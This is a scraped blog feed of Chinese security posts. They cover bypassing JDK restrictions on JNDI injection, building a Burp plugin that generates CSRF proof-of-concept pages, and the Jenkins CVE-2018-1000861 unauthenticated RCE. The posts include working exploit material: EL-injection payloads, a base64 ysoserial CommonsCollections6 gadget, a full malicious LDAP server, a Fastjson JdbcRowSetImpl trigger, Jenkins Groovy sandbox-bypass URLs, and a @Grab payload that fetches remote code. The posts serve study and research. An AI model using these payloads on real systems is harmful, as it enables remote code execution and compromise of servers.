\"''.getClass().forName('javax.script.ScriptEngineManager')\" +// \".newInstance().getEngineByName('JavaScript')\" +// \".eval(\\\"java.lang.Runtime.getRuntime().exec('calc')\\\")\"; new ELProcessor().eval(poc); &#125;&#125; 调试分析直接在org.apache.naming.factory.BeanFactory类getObjectInstance()函数上打上断点debug，此时函数调用栈如下： 1234567getObjectInstance:119, BeanFactory (org.apache.naming.factory)getObjectInstance:321, NamingManager (javax.naming.spi)decodeObject:499, RegistryContext (com.sun.jndi.rmi.registry)lookup:138, RegistryContext (com.sun.jndi.rmi.registry)lookup:205, GenericURLContext (com.sun.jndi.toolkit.url)lookup:417, InitialContext (javax.naming)main:8, Client 这里注意到javax.naming.spi.NamingManager类的getObjectInstance()函数，其中调用了getObjectFactoryFromReference()函数来从Reference中获取ObjectFactory类实例，跟进去会发现是通过loadClass()函数来加载我们传入的org.apache.naming.factory.BeanFactory类，然后新建该类实例并将其转换成ObjectFactory类型，也就是说，我们传入的Factory类必须实现ObjectFactory接口类、而org.apache.naming.factory.BeanFactory正好满足这一点： 往下，直接调用ObjectFactory接口实现类实例的getObjectInstance()函数，这里是BeanFactory类实例的getObjectInstance()函数： 跟进看到org.apache.naming.factory.BeanFactory类的getObjectInstance()函数中，会判断obj参数是否是ResourceRef类实例，是的话代码才会往下走，这就是为什么我们在恶意RMI服务端中构造Reference类实例的时候必须要用Reference类的子类ResourceRef类来创建实例： 接着获取Bean类为javax.el.ELProcessor后，实例化该类并获取其中的forceString类型的内容，其值是我们构造的x=eval内容： 继续往下调试可以看到，查找forceString的内容中是否存在”=”号，不存在的话就调用属性的默认setter方法，存在的话就取键值、其中键是属性名而对应的值是其指定的setter方法。如此，之前设置的forceString的值就可以强制将x属性的setter方法转换为调用我们指定的eval()方法了，这是BeanFactory类能进行利用的关键点！之后，就是获取beanClass即javax.el.ELProcessor类的eval()方法并和x属性一同缓存到forced这个HashMap中： 接着是多个do while语句来遍历获取ResourceRef类实例addr属性的元素，当获取到addrType为x的元素时退出当前所有循环，然后调用getContent()函数来获取x属性对应的contents即恶意表达式。这里就是恶意RMI服务端中ResourceRef类实例添加的第二个元素： 获取到类型为x对应的内容为恶意表达式后，从前面的缓存forced中取出key为x的值即javax.el.ELProcessor类的eval()方法并赋值给method变量，最后就是通过method.invoke()即反射调用的来执行new ELProcessor().eval(&quot;&quot;.getClass().forName(&quot;javax.script.ScriptEngineManager&quot;).newInstance().getEngineByName(&quot;JavaScript&quot;).eval(&quot;new java.lang.ProcessBuilder[&#39;(java.lang.String[])&#39;]([&#39;cmd&#39;, &#39;/C&#39;, &#39;calc.exe&#39;]).start()&quot;))： 小结小结一下几个关键点： 这种方法是从本地ClassPath中寻找可能存在Tomcat相关依赖包来进行触发利用，已知的类是org.apache.naming.factory.BeanFactory； 由于org.apache.naming.factory.BeanFactory类的getObjectInstance()方法会判断是否为ResourceRef类实例，因此在RMI服务端绑定的Reference类实例中必须为Reference类的子类ResourceRef类实例，这里resourceClass选择的也是在Tomcat环境中存在的javax.el.ELProcessor类； ResourceRef类实例分别添加了两次StringRefAddr类实例元素，第一次是类型为forceString、内容为x=eval的StringRefAddr类实例，这里看org.apache.naming.factory.BeanFactory类的getObjectInstance()方法源码发现，程序会判断是否存在=号，若存在则将x属性的默认setter方法设置为我们eval；第二次是类型为x、内容为恶意表达式的StringRefAddr类实例，这里是跟前面的x属性关联起来，x属性的setter方法是eval()，而现在它的内容为恶意表达式，这样就能串起来调用javax.el.ELProcessor类的eval()函数执行恶意表达式从而达到攻击利用的目的； 利用LDAP返回序列化数据，触发本地Gadget之前在JNDI注入的文章中讲到了可以利用LDAP+Reference的方式进行攻击利用，但是在JDK 8u191以后的版本中增加了com.sun.jndi.ldap.object.trustURLCodebase选项，默认为false，禁止LDAP协议使用远程codebase的选项，把LDAP协议的攻击途径也给禁了。但是，攻击者仍然可以通过服务端本地ClassPath中存在的反序列化漏洞Gadget来绕过高版本JDK的限制。 LDAP服务端除了支持JNDI Reference这种利用方式外，还支持直接返回一个序列化的对象。如果Java对象的javaSerializedData属性值不为空，则客户端的obj.decodeObject()方法就会对这个字段的内容进行反序列化。此时，如果服务端ClassPath中存在反序列化咯多功能利用Gadget如CommonsCollections库，那么就可以结合该Gadget实现反序列化漏洞攻击。 攻击利用假设目标环境存在Commons-Collections-3.2.1包，且存在JNDI的lookup()注入或Fastjson反序列化漏洞。 使用ysoserial工具生成Commons-Collections这条Gadget并进行Base64编码输出： 1java -jar ysoserial-master-6eca5bc740-1.jar CommonsCollections6 'calc' | base64 输出如下： 1rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABXNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAN4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNzO3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAnQACmdldFJ1bnRpbWV1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAB0AAlnZXRNZXRob2R1cQB+ABsAAAACdnIAEGphdmEubGFuZy5TdHJpbmeg8KQ4ejuzQgIAAHhwdnEAfgAbc3EAfgATdXEAfgAYAAAAAnB1cQB+ABgAAAAAdAAGaW52b2tldXEAfgAbAAAAAnZyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHZxAH4AGHNxAH4AE3VyABNbTGphdmEubGFuZy5TdHJpbmc7rdJW5+kde0cCAAB4cAAAAAF0AARjYWxjdAAEZXhlY3VxAH4AGwAAAAFxAH4AIHNxAH4AD3NyABFqYXZhLmxhbmcuSW50ZWdlchLioKT3gYc4AgABSQAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAABc3IAEWphdmEudXRpbC5IYXNoTWFwBQfawcMWYNEDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xkeHA/QAAAAAAAAHcIAAAAEAAAAAB4eHg= 恶意LDAP服务器如下，主要是在javaSerializedData字段内填入刚刚生成的反序列化payload数据： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110import com.unboundid.ldap.listener.InMemoryDirectoryServer;import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;import com.unboundid.ldap.listener.InMemoryListenerConfig;import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;import com.unboundid.ldap.sdk.Entry;import com.unboundid.ldap.sdk.LDAPException;import com.unboundid.ldap.sdk.LDAPResult;import com.unboundid.ldap.sdk.ResultCode;import com.unboundid.util.Base64;import javax.net.ServerSocketFactory;import javax.net.SocketFactory;import javax.net.ssl.SSLSocketFactory;import java.net.InetAddress;import java.net.MalformedURLException;import java.net.URL;import java.text.ParseException;public class LdapServer &#123; private static final String LDAP_BASE = \"dc=example,dc=com\"; public static void main (String[] args) &#123; String url = \"http://127.0.0.1:8000/#EvilObject\"; int port = 1234; try &#123; InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE); config.setListenerConfigs(new InMemoryListenerConfig( \"listen\", InetAddress.getByName(\"0.0.0.0\"), port, ServerSocketFactory.getDefault(), SocketFactory.getDefault(), (SSLSocketFactory) SSLSocketFactory.getDefault())); config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(url))); InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config); System.out.println(\"Listening on 0.0.0.0:\" + port); ds.startListening(); &#125; catch ( Exception e ) &#123; e.printStackTrace(); &#125; &#125; private static class OperationInterceptor extends InMemoryOperationInterceptor &#123; private URL codebase; /** * */ public OperationInterceptor ( URL cb ) &#123; this.codebase = cb; &#125; /** * &#123;@inheritDoc&#125; * * @see com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult) */ public void processSearchResult ( InMemoryInterceptedSearchResult result ) &#123; String base = result.getRequest().getBaseDN(); Entry e = new Entry(base); try &#123; sendResult(result, base, e); &#125; catch ( Exception e1 ) &#123; e1.printStackTrace(); &#125; &#125; protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException &#123; URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(\".class\")); System.out.println(\"Send LDAP reference result for \" + base + \" redirecting to \" + turl); e.addAttribute(\"javaClassName\", \"Exploit\"); String cbstring = this.codebase.toString(); int refPos = cbstring.indexOf('#'); if ( refPos &gt; 0 ) &#123; cbstring = cbstring.substring(0, refPos); &#125; // Payload1: 利用LDAP+Reference Factory// e.addAttribute(\"javaCodeBase\", cbstring);// e.addAttribute(\"objectClass\", \"javaNamingReference\");// e.addAttribute(\"javaFactory\", this.codebase.getRef()); // Payload2: 返回序列化Gadget try &#123; e.addAttribute(\"javaSerializedData\", Base64.decode(\"rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABXNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAN4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNzO3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAnQACmdldFJ1bnRpbWV1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAB0AAlnZXRNZXRob2R1cQB+ABsAAAACdnIAEGphdmEubGFuZy5TdHJpbmeg8KQ4ejuzQgIAAHhwdnEAfgAbc3EAfgATdXEAfgAYAAAAAnB1cQB+ABgAAAAAdAAGaW52b2tldXEAfgAbAAAAAnZyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHZxAH4AGHNxAH4AE3VyABNbTGphdmEubGFuZy5TdHJpbmc7rdJW5+kde0cCAAB4cAAAAAF0AARjYWxjdAAEZXhlY3VxAH4AGwAAAAFxAH4AIHNxAH4AD3NyABFqYXZhLmxhbmcuSW50ZWdlchLioKT3gYc4AgABSQAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAABc3IAEWphdmEudXRpbC5IYXNoTWFwBQfawcMWYNEDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xkeHA/QAAAAAAAAHcIAAAAEAAAAAB4eHg=\")); &#125; catch (ParseException exception) &#123; exception.printStackTrace(); &#125; result.sendSearchEntry(e); result.setResult(new LDAPResult(0, ResultCode.SUCCESS)); &#125; &#125;&#125; 目标服务端代码，假设存在JNDI lookup()函数注入或Fastjson反序列化漏洞，此时通过JNDI注入实现反序列化漏洞利用： 12345678910111213import com.alibaba.fastjson.JSON;import javax.naming.InitialContext;public class Test &#123; public static void main(String[] args) throws Exception &#123; // lookup参数注入触发// new InitialContext().lookup(\"ldap://127.0.0.1:1234/EvilObject\"); // Fastjson反序列化JNDI注入Gadget触发 String payload =\"&#123;\\\"@type\\\":\\\"com.sun.rowset.JdbcRowSetImpl\\\",\\\"dataSourceName\\\":\\\"ldap://127.0.0.1:1234/EvilObject\\\",\\\"autoCommit\\\":\\\"true\\\" &#125;\"; JSON.parse(payload); &#125;&#125; 运行成功绕过触发： 调试分析从lookup这个触发点来调试（前面Fastjson到最后利用的还是JNDI这个注入点）。 直接在com.sun.jndi.ldap.Obj类的decodeObject()函数上打上断点，此时函数调用栈如下： 12345678decodeObject:235, Obj (com.sun.jndi.ldap)c_lookup:1051, LdapCtx (com.sun.jndi.ldap)p_lookup:542, ComponentContext (com.sun.jndi.toolkit.ctx)lookup:177, PartialCompositeContext (com.sun.jndi.toolkit.ctx)lookup:205, GenericURLContext (com.sun.jndi.toolkit.url)lookup:94, ldapURLContext (com.sun.jndi.url.ldap)lookup:417, InitialContext (javax.naming)main:7, Test 前面的函数调用链都是不同类lookup()函数之间的调用，com.sun.jndi.ldap.LdapCtx类的c_lookup()函数中会调用到com.sun.jndi.ldap.Obj类的decodeObject()函数进行解码对象的操作。 跟进去，先调用getCodebases()函数从JAVA_ATTRIBUTES中取出索引为4即javaCodeBase的内容，由于本次并没有设置这个属性因此返回null即下面Variables框中的var1(slot_2)变量；然后从JAVA_ATTRIBUTES中取出索引为1即javaSerializedData的内容，这个我们是在恶意LDAP服务端中设置了的、内容就是恶意的Commons-Collections这个Gadget的恶意利用序列化对象字节流，对应的是下面Variables框中的var2 (slot_1)变量；这里var1(slot_2)变量为null，传入getURLClassLoader()函数调用后返回的是AppClassLoader即应用类加载器；再往下就是调用deserializeObject()函数来反序列化javaSerializedData的对象字节码： 其中静态变量JAVA_ATTRIBUTES的内容如下： 跟进函数中，就是熟悉的老朋友readObject()了，原生的Java反序列化漏洞就能触发了： 我们回到decodeObject()函数调用的getURLClassLoader()函数中，这是之前使用LDAP+Reference的方式被高版本JDK限制无法利用的地方。跟进去看看： 入参var1是javaCodeBase项设置的内容，由于未设置该项因此直接返回var2变量即AppClassLoader应用类加载器实例。这里看到，如果我们使用LDAP+Reference的方式进行利用的话，是需要设置javaCodeBase项的，此时var1就不为null、满足第一个判断条件，但是第二个条件&quot;true&quot;.equalsIgnoreCase(trustURLCodebase)在高版本JDK中是默认不成立的，即trustURLCodebase值默认为false，因此之前的LDAP+Reference就不能利用了。 0x03 参考如何绕过高版本JDK的限制进行JNDI注入利用 Exploiting JNDI Injections in Java","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"Java","slug":"Java","permalink":"https://www.mi1k7ea.com/tags/Java/"},{"name":"JNDI注入","slug":"JNDI注入","permalink":"https://www.mi1k7ea.com/tags/JNDI注入/"}]},{"title":"BurpExtender开发之CSRF PoC生成器","date":"2020-09-04T06:24:26.000Z","path":"2020/09/04/BurpExtender开发之CSRF-PoC生成器/","text":"0x00 前言最近没搞白嫖版而是用的社区版的Burp，很多功能用不上，而且之前的Burp插件都是基于Python来写的，现在就换Java来写下插件吧，就拿CSRF PoC生成器来练练手。 项目地址：BurpExtender-CSRFPoCGenerator 0x01 Burp插件开发基础主要参考Her0in大佬系列文章： BurpSuite插件开发指南之 API 上篇 – Her0in BurpSuite插件开发指南之 API 下篇 – Her0in BurpSuite插件开发指南之 Java 篇 – Her0in BurpSuite插件开发指南之 Python 篇 – Her0in 当然，官方也给出了一些插件实例供参考学习：https://portswigger.net/burp/extender/ 将Burp提供的扩展接口和使用方式大致了解之后就能入手了。 0x02 插件开发——CSRF PoC生成器Burp的Extender标签下，有个APIs子标签，其中展示了有哪些扩展接口及其功能。这里点击Save Interface files下载下来： 下载下来是个burp文件夹，其中都是Burp插件相关接口的java文件。 使用IDEA打开，将burp包放入src目录中，在burp包下新建名为“BurpExtender”的类： 直接看代码吧。 这里BurpExtender类实现了IBurpExtender接口和IContextMenuFactory接口，其中定义了三个BurpExtender类成员变量，并在registerExtenderCallbacks()函数中完成初始化，然后设置插件名和注册上下文菜单工厂： 12345678910111213141516public class BurpExtender implements IBurpExtender, IContextMenuFactory &#123; public IBurpExtenderCallbacks callbacks; public IExtensionHelpers helpers; public PrintWriter stdout; @Override public void registerExtenderCallbacks(IBurpExtenderCallbacks callbacks) &#123; this.callbacks = callbacks; this.helpers = callbacks.getHelpers(); this.stdout = new PrintWriter(callbacks.getStdout(), true); // 设置插件名 callbacks.setExtensionName(\"Mi1k7ea\"); callbacks.registerContextMenuFactory(this); &#125; Burp所有插件必须实现IBurpExtender接口且命名必须为“BurpExtender”，且必须实现其registerExtenderCallbacks()函数。当插件被加载时，Burp会调用registerExtenderCallbacks()函数并传递一个IBurpExtenderCallbacks类对象，插件可以通过这个对象来调用很多扩展Burp功能必需的方法，比如这里的getHelpers()、getStdout()、setExtensionName()、registerContextMenuFactory()等方法。 getHelpers()函数：用于获取IExtensionHelpers接口类对象，在后续用到了该类的analyzeRequest()函数来解析请求报文； getStdout()函数：用于获取标准输出流，在Extender-&gt;Extensions-&gt;Output窗口中输出内容； setExtensionName()函数：用于设置插件名； registerContextMenuFactory()函数：用于注册自定义上下文菜单项的工厂。当用户在Burp中的任何地方调用一个上下文菜单时就会触发这个工厂函数，根据菜单调用的细节，提供应该被显示在上下文菜单中的任何自定义上下文菜单项； 接着，是实现IContextMenuFactory接口类的createMenuItems()函数，先看外围部分代码： 12345678910111213141516@Overridepublic List&lt;JMenuItem&gt; createMenuItems(IContextMenuInvocation invocation) &#123; // 上下文菜单 List&lt;JMenuItem&gt; jMenuItemList = new ArrayList&lt;&gt;(); JMenu jMenu = new JMenu(\"Mi1k7ea's Extender\"); JMenuItem jMenuItem = new JMenuItem(\"Generate CSRF PoC\"); jMenu.add(jMenuItem); jMenuItemList.add(jMenu); // 监听上下文菜单点击事件 jMenuItem.addActionListener(e -&gt; &#123; ... &#125;); return jMenuItemList;&#125; 这里其实涉及到的就是Java Swing编程，具体看网上资料即可。主要是创建自己的上下文菜单项然后设置监听事件，当点击时触发addActionListener()函数里面的代码逻辑。 其中监听触发的代码，直接看注释就行： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475// 生成PoC的GUI框JFrame frame = new JFrame(\"CSRF PoC\");JPanel codePanel = new JPanel(new GridLayout());// getSelectedMessages()函数用于获取当前显示的或用户选中的HTTP请求/响应的细节// analyzeRequest()函数用于分析HTTP请求信息以便获取到多个键的值IHttpRequestResponse iHttpRequestResponse = invocation.getSelectedMessages()[0];IRequestInfo iRequestInfo = this.helpers.analyzeRequest(iHttpRequestResponse);URL url = iRequestInfo.getUrl();String method = iRequestInfo.getMethod();String http_method = \"\";String request_url = \"\";String params = \"\";try &#123; // 获取request参数并生成对应input标签 List&lt;IParameter&gt; iParameters = iRequestInfo.getParameters(); for (IParameter iParameter : iParameters) &#123; if (method.equals(\"POST\")) &#123; request_url = url.toString(); http_method = \" method=\\\"POST\\\"\"; if (iParameter.getType() == IParameter.PARAM_BODY) &#123; params += \" &lt;input type=\\\"hidden\\\" name=\\\"\" + EncodeSpecialChars(iParameter.getName()) + \"\\\" value=\\\"\" + EncodeSpecialChars(iParameter.getValue()) + \"\\\" /&gt;\\n\"; &#125; &#125; else if (method.equals(\"GET\")) &#123; request_url = url.toString().split(\"\\\\?\")[0]; http_method = \" method=\\\"GET\\\"\"; if (iParameter.getType() == IParameter.PARAM_URL) &#123; params += \" &lt;input type=\\\"hidden\\\" name=\\\"\" + EncodeSpecialChars(iParameter.getName()) + \"\\\" value=\\\"\" + EncodeSpecialChars(iParameter.getValue()) + \"\\\" /&gt;\\n\"; &#125; &#125; &#125;&#125; catch (Exception exception) &#123; exception.printStackTrace();&#125;// 组合成CSRF自动提交PoCfinal String PoC = \"&lt;html&gt;\\n\" + \" &lt;body&gt;\\n\" + \" &lt;form action=\\\"\" + request_url + \"\\\"\" + http_method + \"&gt;\\n\" + params + \" &lt;input type=\\\"submit\\\" value=\\\"Submit request\\\" /&gt;\\n\" + \" &lt;/form&gt;\\n\" + \" &lt;/body&gt;\\n\" + \" &lt;script&gt;\\n\" + \" var m = document.getElementsByTagName('form')[0];\\n\" + \" m.submit();\\n\" + \" &lt;/script&gt;\\n\" + \"&lt;/html&gt;\";;// 将PoC设置到新建的GUI框中JTextArea jt = new JTextArea(PoC);JScrollPane scrollPane = new JScrollPane(jt);jt.setEditable(false);frame.add(codePanel, BorderLayout.CENTER);codePanel.add(scrollPane);// 新建Buttom用于Copy PoCJPanel buttonPanel = new JPanel(new FlowLayout());JButton button = new JButton(\"Copy\");buttonPanel.add(button);frame.add(buttonPanel, BorderLayout.PAGE_END);button.addActionListener(e1 -&gt; &#123; Toolkit toolkit = Toolkit.getDefaultToolkit(); Clipboard clipboard = toolkit.getSystemClipboard(); StringSelection CSRFCodeToCopy = new StringSelection(PoC); clipboard.setContents(CSRFCodeToCopy, CSRFCodeToCopy);&#125;);// 设置GUI框样式frame.setSize(600,500);frame.setVisible(true);frame.setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE); 其中EncodeSpecialChars()函数用于处理一些PoC的input标签中特殊字符和解码问题： 12345678910111213141516// 进行URL解码和对input标签内的属性值特殊字符进行HTML编码，可自行补充public static String EncodeSpecialChars(String content) throws Exception &#123; content = URLDecoder.decode(content, \"UTF-8\"); String special_word = \"&lt;&gt;\\\"'\"; for (int i = 0; i &lt; special_word.length(); i++) &#123; char word = special_word.charAt(i); String w = Character.toString(word); if (content.contains(w)) &#123; String ascii_word = Integer.toString(word); String html_word = \"&amp;#\" + ascii_word + \";\"; System.out.println(html_word); content = content.replace(w, html_word); &#125; &#125; return content;&#125; OK，最后来看下效果吧。 将项目打包成jar包后，然后加载进来： 对任意报文，右键就能看到插件，点击就能加载生成CSRF PoC： OK，更多的插件后面再写。","tags":[{"name":"安全开发","slug":"安全开发","permalink":"https://www.mi1k7ea.com/tags/安全开发/"},{"name":"Java","slug":"Java","permalink":"https://www.mi1k7ea.com/tags/Java/"},{"name":"BurpSuite","slug":"BurpSuite","permalink":"https://www.mi1k7ea.com/tags/BurpSuite/"}]},{"title":"（先知首发）从Jenkins RCE看Groovy代码注入","date":"2020-08-26T11:35:06.000Z","path":"2020/08/26/从Jenkins-RCE看Groovy代码注入/","text":"先知：https://xz.aliyun.com/t/8231 0x00 前言最近看了下Jenkins相关漏洞，实在是太膜拜Orange大佬的挖掘思路了！！！分析下之后发现不会Groovy，在学习借鉴Me7ell大佬分享的Groovy文章下，于是就整理出本篇文章。 0x01 从Jenkins RCE看起（CVE-2018-1000861）简介Jenkins是一个独立的开源软件项目，是基于Java开发的一种持续集成工具，用于监控持续重复的工作，旨在提供一个开放易用的软件平台，使软件的持续集成变成可能。前身是Hudson是一个可扩展的持续集成引擎。可用于自动化各种任务，如构建，测试和部署软件。 Jenkins Pipeline是一套插件，支持将连续输送Pipeline实施和整合到Jenkins。Pipeline提供了一组可扩展的工具，用于通过PipelineDSL为代码创建简单到复杂的传送Pipeline。 Jenkins远程代码执行漏洞（CVE-2018-1000861），简单地说，就是利用Jenkins动态路由机制的缺陷来绕过ACL的限制，结合绕过Groovy沙箱的Groovy代码注入来实现无验证RCE的攻击利用。 漏洞复现直接用的Vulhub的环境：https://vulhub.org/#/environments/jenkins/CVE-2018-1000861/ PoC： 1http://your-ip:8080/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&amp;value=%70%75%62%6c%69%63%20%63%6c%61%73%73%20%78%20%7b%0d%0a%20%20%70%75%62%6c%69%63%20%78%28%29%7b%0d%0a%20%20%20%20%22%74%6f%75%63%68%20%2f%74%6d%70%2f%6d%69%31%6b%37%65%61%22%2e%65%78%65%63%75%74%65%28%29%0d%0a%20%20%7d%0d%0a%7d 其中URL编码部分为： 12345public class x &#123; public x()&#123; \"touch /tmp/mi1k7ea\".execute() &#125;&#125; 除此之外，还有其他类型的PoC： 12345678910@groovy.transform.ASTTest(value=&#123; \"touch /tmp/mi1k7ea\".execute() &#125;)class Person&#123;&#125;或@groovy.transform.ASTTest(value=&#123;assert Runtime.getRuntime().exec(\"touch /tmp/mi1k7ea\")&#125;)class Person&#123;&#125;或@GrabConfig(disableChecksums=true)@GrabResolver(name='Exp', root='http://127.0.0.1:8000/')@Grab(group='test', module='poc', version='0')import Exp; 无需登录认证发起攻击： 成功RCE： 漏洞原理简析网上很多文章包括Orange大佬的博客都讲解得很详细了，这里只是简单提下关键点。 Jenkins动态路由机制Jenkins是基于Stapler框架开发的，在web.xml中可以看到Jenkins是将所有的请求交给org.kohsuke.stapler.Stapler来进行处理的，而Stapler是使用一套Naming Convention来实现动态路由的。该动态路由机制是先以/作为分隔符将URL切分，然后以jenkins.model.Jenkins作为入口点开始往下遍历，如果URL切分部分满足以下条件则继续往下调用： Public属性的成员变量； Public属性的方法，主要是getter方法，具体如下： get&lt;token&gt;() get&lt;token&gt;(String) get&lt;token&gt;(Int) get&lt;token&gt;(Long) get&lt;token&gt;(StaplerRequest) getDynamic(String, …) doDynamic(…) do&lt;token&gt;(…) js&lt;token&gt;(…) Class method with @WebMethod annotation Class method with @JavaScriptMethod annotation 简单地说，Jenkins动态路由机制在解析URL的时候会调用相关类的getter方法。 Jenkins白名单路由Jenkins动态路由主要调用的是org.kohsuke.stapler.Stapler#tryInvoke()方法，该方法会对除了boundObjectTable外所有node都会进行一次权限检查，具体实现在jenkins.model.Jenkins#getTarget()中，这其中实际就是一个URL前缀白名单检查： 12345678910111213private static final ImmutableSet&lt;String&gt; ALWAYS_READABLE_PATHS = ImmutableSet.of( \"/login\", \"/logout\", \"/accessDenied\", \"/adjuncts/\", \"/error\", \"/oops\", \"/signup\", \"/tcpSlaveAgentListener\", \"/federatedLoginService/\", \"/securityRealm\", \"/instance-identity\"); 因此，绕过ACL的关键在于，要在上述白名单的一个入口点中找到其他对象的Reference（引用），来跳到非白名单成员从而实现绕过白名单URL前缀的限制。 通过对象间的Reference绕过ACL如上所述，关键在于找到一个Reference作为跳板来绕过，Orange给出了如下跳板： 1/securityRealm/user/[username]/descriptorByName/[descriptor_name]/ 该跳板在动态路由中会依次执行如下方法： 123jenkins.model.Jenkins.getSecurityRealm().getUser([username]).getDescriptorByName([descriptor_name]) 这是因为在Jenkins中，每个对象都是继承于hudson.model.Descriptor类，而继承该类的对象可以通过调用hudson.model.DescriptorByNameOwner#getDescriptorByName(String)方法来进行调用。 RCE GadgetOrange给出了好几条可结合利用的漏洞利用链，其中之最当然是RCE的Gadget。 前面简介中提到了Jenkins Pipeline，它其实就是基于Groovy实现的一个DSL，可使开发者十分方便地去编写一些Build Script来完成自动化的编译、测试和发布。 在Jenkins中，大致使用如下代码来检测Groovy的语法： 12345678910public JSON doCheckScriptCompile(@QueryParameter String value) &#123; try &#123; CpsGroovyShell trusted = new CpsGroovyShellFactory(null).forTrusted().build(); new CpsGroovyShellFactory(null).withParent(trusted).build().getClassLoader().parseClass(value); &#125; catch (CompilationFailedException x) &#123; return JSONArray.fromObject(CpsFlowDefinitionValidator.toCheckStatus(x).toArray()); 